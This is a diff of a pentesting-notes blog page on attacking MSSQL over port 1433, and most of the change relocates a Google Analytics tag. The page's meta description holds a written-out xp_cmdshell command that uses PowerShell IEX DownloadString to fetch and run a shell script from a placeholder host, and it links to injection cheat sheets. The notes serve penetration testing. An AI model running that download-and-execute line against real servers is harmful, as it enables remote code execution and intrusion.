@@ -11,6 +11,17 @@
     <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.fe9a01128f24537e52223a846795c30968baf4cbb17d0f03a14ea859993459ca.css" />
 
     
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-SLVHGT13XR', { 'anonymize_ip': false });
+}
+</script>
+
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Notes - Attack by ports/protocols: MSSQL tcp:1433"/>
 <meta name="twitter:description" content="tcp/1433 mssql RCE: https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server#execute-commands &gt; impacket-mssqlclient &lt;user&gt;:&lt;pass&gt;@&lt;ip&gt;&gt; enable_xp_cmdshell&gt; xp_cmdshell powershell.exe IEX (New-Object Net.WebClient).DownloadString(\&#34;http://&lt;ip&gt;/shell.ps1\&#34;); error-based injeciton https://www.exploit-db.com/papers/12975 https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/ cracking mdf files https://github.com/improvedk/OrcaMDF https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes "/>
@@ -44,15 +55,6 @@
       
   <article class="post">
     <header class="post-header">
-      
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-SLVHGT13XR"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-SLVHGT13XR');
-</script>
       <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8083932952140695"
      crossorigin="anonymous"></script>
       <h1 class ="post-title">Notes - Attack by ports/protocols: MSSQL tcp:1433</h1>
